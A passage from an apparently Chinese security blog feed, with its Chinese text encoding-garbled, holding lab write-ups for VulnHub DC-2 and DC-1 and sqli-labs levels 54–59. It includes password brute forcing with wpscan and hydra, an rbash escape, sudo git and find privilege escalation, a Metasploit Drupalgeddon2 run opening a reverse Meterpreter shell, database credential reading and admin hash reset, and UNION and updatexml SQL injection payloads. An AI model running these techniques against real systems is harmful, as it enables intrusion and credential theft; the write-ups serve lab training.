<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<p>æ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
</blockquote>
<p>å¼€æ”¾äº†80ç«¯å£å’Œsshç«¯å£ï¼Œæµè§ˆå™¨å»è®¿é—®å‘ç°æ— æ³•è®¿é—®ï¼Œç›´æ¥è·³è½¬æˆäº†dc2ï¼Œå»ä¿®æ”¹hosts</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>æ·»åŠ  192.168.18.132 dc-2</p>
</blockquote>
<p>å†å»è®¿é—®192.168.18.132å³å¯,å‘ç°æ˜¯wordpress</p>
<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>ç‚¹å‡»flag å¾—åˆ°flag1ï¼Œæç¤ºä½¿ç”¨<code>cewl</code></p>
<p><img src="/posts/e4e28081/flag1.png"></p>
<p>ç”¨<code>dirb</code>æ‰«ä¸€ä¸‹ç›®å½•</p>
<p>æ‰«åˆ°ä¸€ä¸ªwp-admin å»è®¿é—®åä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢ <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
<p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨<code>nikto</code></p>
<p><img src="/posts/e4e28081/nikto1.png"></p>
<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>ä½¿ç”¨kaliè‡ªå¸¦çš„wpscanæ‰«ä¸€ä¸‹<br><code>wpscan --url dc-2 -e u</code></p>
<p><img src="/posts/e4e28081/wpscan1.png"></p>
<br>

<p>æ‰«åˆ°ä¸‰ä¸ªç”¨æˆ·åï¼Œadmin,jerry,tom<br>åˆ›å»ºä¸€ä¸ªlistå­˜æ”¾è¿™ä¸‰ä¸ªç”¨æˆ·å</p>
<br>

<p>æ ¹æ®flag1çš„æç¤º ä½¿ç”¨<code>cewl</code>ç”Ÿæˆå¯†ç å­—å…¸</p>
<br>

<blockquote>
<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#111;&#x62;&#x69;&#x6e;&#x40;&#100;&#x69;&#103;&#x69;&#x2e;&#110;&#105;&#x6e;&#x6a;&#97;">&#114;&#111;&#x62;&#x69;&#x6e;&#x40;&#100;&#x69;&#103;&#x69;&#x2e;&#110;&#105;&#x6e;&#x6a;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
</blockquote>
<p>ä½¿ç”¨wpscançˆ†ç ´</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ wpscan â€“url dc-2 -U dc-2users.list  -P dc-2.dic </p>
<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
</blockquote>
<p><img src="/posts/e4e28081/wpscan2.png"></p>
<p>ä½¿ç”¨tom æˆåŠŸç™»å½•ï¼Œå‘ç°æœ‰ç¯‡åä¸ºhello-wordçš„æ–‡ç« è¿›å»çœ‹çœ‹</p>
<p>æœ‰ä¸€ä¸ªæœç´¢åŠŸèƒ½ï¼Œå°è¯•ä¸€ä¸‹ï¼Œå‘ç°è¾“å…¥1ä¼šå‡ºç°flag1,è¾“å…¥2å‡ºç°flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2æç¤ºæ¢ä¸€æ¡è·¯ï¼Œä¹Ÿæ˜¯å°±è¯´è®©æˆ‘ä»¬å»å°è¯•sshç«¯å£</p>
<p>ä½¿ç”¨hydraçˆ†ç ´ssh</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
<p> å¾—åˆ°è´¦å·å¯†ç </p>
<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
</blockquote>
<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>ä½¿ç”¨sshç™»å½•<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>ç™»å½•å<code>ls</code>åå‘ç°å­˜åœ¨flag3.txt</p>
<p>ä½¿ç”¨<code>cat flag3.txt</code></p>
<blockquote>
<p>-rbash: sudo: command not found</p>
</blockquote>
<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
<p><strong>-rbashç»•è¿‡</strong><br>è§£å†³æ–¹æ¡ˆ <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a </span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>
<p><img src="/posts/e4e28081/flag3.png"></p>
<p>å¾—åˆ°flag3</p>
<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>æ ¹æ®flag3æç¤ºï¼Œä½¿ç”¨<code>su</code>åˆ‡æ¢åˆ°jerryç”¨æˆ·ä¸‹<br><code>cat /etc/passwd </code>å‘ç°Jerryç”¨æˆ·<br>è¾“å…¥ä¹‹å‰çˆ†ç ´å‡ºæ¥çš„å¯†ç æˆåŠŸç™»å½•Jerryç”¨æˆ·</p>
<blockquote>
<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that youâ€™ve made it this far - but youâ€™re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - youâ€™re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
</blockquote>
<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>æŸ¥çœ‹sudo æ”¯æŒçš„å…å¯†å‘½ä»¤</p>
<blockquote>
<p>sudo -l</p>
<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
</blockquote>
<p>æ ¹æ®ä¸Šä¸€ä¸ªæç¤º è¿™é‡Œçš„gitå‘½ä»¤æ¨æµ‹å¯ä»¥ä½¿ç”¨</p>
<p>è€ƒè™‘gitææƒ <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
<blockquote>
<p>sudo git -p â€“help</p>
</blockquote>
<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
<p><strong>æ€»ç»“</strong></p>
<ul>
<li> rbashç»•è¿‡</li>
<li> gitææƒ</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges1</title>
    <url>/posts/7debd13b/</url>
    <content><![CDATA[<p>å®‰è£…</p>
<p>ä¸‹è½½è§£å‹åä½¿ç”¨Vmwareæ‰“å¼€ovaæ–‡ä»¶ï¼Œé€‰æ‹©æ¡¥æ¥æ¨¡å¼ï¼ŒåŒæ—¶ä¹Ÿå°†kaliè®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼</p>
<br>

<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>é¶æœº 192.168.18.130</p>
</blockquote>
<br>

<p>æ‰«æç½‘æ®µ</p>
<blockquote>
<p><strong>sudo nmap -sn 192.168.18.0/24</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:30 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.130<br>Host is up (0.00018s latency).<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00036s latency).<br>MAC Address: 00:50:56:F1:CD:81 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
</blockquote>
<br>

<p>æ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p><strong>sudo nmap -sS 192.168.18.130</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:31 CST<br>Nmap scan report for 192.168.18.130<br>Host is up (0.000079s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</p>
<p>æ³¨ï¼šsS ï¼šåŠå¼€æ”¾æ‰«æï¼ˆé3æ¬¡æ¡æ‰‹çš„tcpæ‰«æï¼‰æ¯”è¾ƒå®‰å…¨ï¼Œä¸ä¼šäº§ç”Ÿä¼šè¯ï¼Œå‡ ä¹ä¸ä¼šäº§ç”Ÿæ—¥å¿—ï¼Œå·¥ä½œä¸­å¸¸ç”¨ï¼Œå»ºè®®å¤§å®¶ä¸è¦ç›´æ¥å…¨ä¸Šçš„å»æ‰«ï¼Œç¨³å¦¥æ›´ç¨³å¦¥ï¼Œéœ€è¦æœ‰rootæƒé™</p>
</blockquote>
<p>å‘ç°å¼€æ”¾äº†80ç«¯å£ï¼Œå°±ç”¨æµè§ˆå™¨å»è®¿é—®ä¸€ä¸‹<code>192.168.18.130:80</code> æ ¹æ®ç½‘ç«™é¡µé¢æ˜¾ç¤ºä¿¡æ¯å¯ä»¥åˆ¤æ–­æ˜¯Drupalçš„CMS</p>
<p>ç”¨dirsearchæ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰ä»€ä¹ˆ</p>
<blockquote>
<p><strong>python3 dirsearch.py -u 192.168.18.130:80</strong></p>
</blockquote>
<p>ç”¨dirb æ‰«ä¸€ä¸‹è¯•è¯•</p>
<blockquote>
<p><strong>dirb <a href="http://192.168.18.130/">http://192.168.18.130</a></strong></p>
</blockquote>
<p>æ²¡æ‰¾åˆ°å•¥æœ‰ç”¨çš„ä¿¡æ¯ï¼Œçœ‹ä¸‹robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p>
<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; search drupal</span><br><span class="line">msf6 &gt; use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; set rhosts 192.168.18.130</span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.18.131:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.18.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.18.131:4444 -&gt; 192.168.18.130:43581) at 2021-04-28 20:26:27 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">&#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: &#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4653 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">å‘ç°ä¸‹é¢æœ‰ä¸ªfalg4  flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;home&#x2F;flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>

<br>

<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹ç½‘ç«™é…ç½® çœ‹æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;site&#x2F;default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"> </span><br><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>ç”¨pythonåå¼¹ä¸ªäº¤äº’å¼shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<br>

<br>

<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>é¡ºä¾¿å¾—åˆ°äº†æ•°æ®åº“ä¿¡æ¯ï¼Œç™»å½•æ•°æ®åº“çœ‹çœ‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www&#x2F;sites&#x2F;default$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 418639</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and&#x2F;or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and&#x2F;or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables from drupaldb;</span><br><span class="line">  ... ...</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia&#x2F;Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia&#x2F;Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">drupalå¯†ç çš„åŠ å¯†æ˜¯ç ´è§£ä¸å‡ºæ¥ï¼Œéœ€è¦é‡ç½®ç®¡ç†çš„å¯†ç (åŠ å¯†è„šæœ¬ä½ç½®åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„scripts&#x2F;password-hash.sh)</span><br><span class="line">php scripts&#x2F;password-hash.sh admin  (adminæ˜¯ä½ è¦è®¾ç½®çš„æ–°å¯†ç )</span><br><span class="line"></span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh admin</span><br><span class="line">php scripts&#x2F;password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: $S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å»æ•°æ®åº“ä¿®æ”¹å¯†ç </span><br><span class="line">mysql&gt; update users set pass &#x3D;&quot;$S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;</span><br><span class="line">&lt;N1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;                      </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">é‡ç½®å®Œå¯†ç åç™»å½•ç½‘ç«™ (admin admin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/7debd13b/DCchallenges1.png"></p>
<br>

<br>

<br>

<p>ä½†æ˜¯å‘ç°å½“å‰æƒé™ä¸å¤Ÿ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>ä½¿ç”¨<code>find</code>ææƒ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ touch dctest        </span><br><span class="line">touch dctest</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec whoami \;</span><br><span class="line">find dctest -exec whoami \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec ls &#x2F;root \;</span><br><span class="line">find dctest -exec ls &#x2F;root \;</span><br><span class="line">thefinalflag.txt</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://www.freebuf.com/articles/web/260236.html">https://www.freebuf.com/articles/web/260236.html</a></p>
<p><a href="https://blog.csdn.net/wang_624/article/details/90509951">https://blog.csdn.net/wang_624/article/details/90509951</a></p>
<p><a href="https://f5.pm/go-53516.html">https://f5.pm/go-53516.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/218073.html">https://www.freebuf.com/articles/network/218073.html</a></p>
<p><a href="https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1">https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labsæ€»ç»“</title>
    <url>/posts/6db7f8ba/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs5</title>
    <url>/posts/fdded023/</url>
    <content><![CDATA[<h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br>

<p><code>id=0&#39; and 1=1 union select 1,2,3 --+</code></p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3 --+</code></p>
<p>dbs challenges</p>
<p>table qpu4f7zhcb</p>
<p>columns  sessid,secret_6KIK,tryy</p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;qpu4f7zhcb&#39;),3 --+</code></p>
<br>

<p>id=0â€™ and 1=1 union select 1,(select sessid from qpu4f7zhcb limit 0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1)  â€“+</p>
<br>

<br>

<h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><p><code>)</code>é—­åˆ </p>
<p><code>http://127.0.0.1/sqli-labs/Less-55/?id=0) union select 1,database(),3 --+</code></p>
<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3--+</code></p>
<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8bgb8hj1sk&#39;),3 --+</code></p>
<p>secret_MCQ1</p>
<p><code>id=0) union select 1,(select sessid from 8bgb8hj1sk limit 0,1),(select secret_MCQ1 from 8bgb8hj1sk limit 0,1)  --+</code></p>
<br>

<h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><p><code>&#39;)</code>é—­åˆ æ–¹æ³•è¿˜æ˜¯ä¸€æ ·çš„</p>
<br>

<h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
<br>

<h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><p>ä½¿ç”¨<code>?id=1 and 1=1 union select 1,2,3</code>æ— å›æ˜¾</p>
<p>å°è¯•æŠ¥é”™æ³¨å…¥</p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;y0584eq2pg&#39;),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
<br>

<h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><p>æ•°å­—å‹ å’Œ58ä¸€æ ·</p>
